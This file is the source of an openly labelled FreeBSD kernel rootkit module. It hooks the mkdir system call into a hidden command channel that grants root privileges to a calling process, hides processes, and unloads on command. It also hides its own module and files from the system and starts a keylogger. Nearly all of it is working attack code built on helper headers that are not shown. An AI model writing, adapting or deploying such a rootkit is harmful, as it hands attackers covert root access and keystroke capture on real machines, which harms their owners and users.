/*
 * Copyright (c) 2019 Jasper Lowell
 * Copyright (c) 2019 Wesley Hamburger
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "config.h"
#include "debug.h"
#include "privilege.h"
#include "hook.h"
#include "hide.h"
#include "keylog.h"

#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>

static char *mkdir_prepatch;

static int mkdir_hook(struct thread *td, void *syscall_args);
static int handle_request(struct thread *td, char *command);

static void
init(void)
{
	/* Enable interface. */
	mkdir_prepatch = hook_fetch(sys_mkdir);
	hook(sys_mkdir, mkdir_hook);

	/* Hide rootkit. */
	hide_kld(LINKER_NAME);
	hide_ko(MODULE_NAME);

	/* Hide files. */
	hide_files();

	/*start keylogging. */
	start_keylog();
}

static void
die(void)
{
	/* Disable interface. */
	hook_set(sys_mkdir, mkdir_prepatch);
	free(mkdir_prepatch, M_TEMP);

	/* Unhide files. */
	unhide_files();

	/*Stop Keylog. */
	stop_keylog();
}

static int
load(struct module *module, int cmd, void *arg)
{
	switch(cmd)
	{
		case MOD_LOAD:
			LOGI("[rootkit:load] Rootkit loaded.\n");
			init();
			break;
		case MOD_UNLOAD:
			LOGI("[rootkit:load] Rootkit unloaded.\n");
			break;
		default:
			LOGE("[rootkit:load] Unsupported event: {%d}.\n", cmd);
			break;
	}

	return(0);
}

static int
mkdir_hook(struct thread *td, void *syscall_args) {
	int ret;
	int error;
	char path[255];

	struct mkdir_args *uap;
	uap = (struct mkdir_args *) syscall_args;

	error = copyinstr(uap->path, path, 255, NULL);
	if (!error)
	{
		if (handle_request(td, path) == 0)
		{
			return(0);
		}
	}

	hook_set(sys_mkdir, mkdir_prepatch);
	ret = sys_mkdir(td, syscall_args);
	hook(sys_mkdir, mkdir_hook);

	return(ret);
}

static int
handle_request(struct thread *td, char *command)
{
	/* Valid commands are RKCALL_LEN long. */
	if (strnlen(command, RKCALL_LEN) != RKCALL_LEN)
	{
		return(-1);
	}

	/* Check if the command is valid.
	 * If the command is valid, the request will be handled. */
	if (strcmp(command, RKCALL_ELEVATE) == 0)
	{
		LOGI("[rootkit:handle_request] ELEVATE request recieved.\n");
		privilege_set(td, 0);
		return(0);
	}
	else if (strcmp(command, RKCALL_HIDE) == 0)
	{
		LOGI("[rootkit:handle_request] HIDE request recieved.\n");
		hide_process_by_id(td->td_proc->p_pid);
		return(0);
	}
	else if (strcmp(command, RKCALL_DIE) == 0)
	{
		LOGI("[rootkit:handle_request] DIE request recieved.\n");
		die();
		return(0);
	}

	return(-1);
}

static moduledata_t rootkit_mod = {
	MODULE_NAME,
	load,
	NULL
};

DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
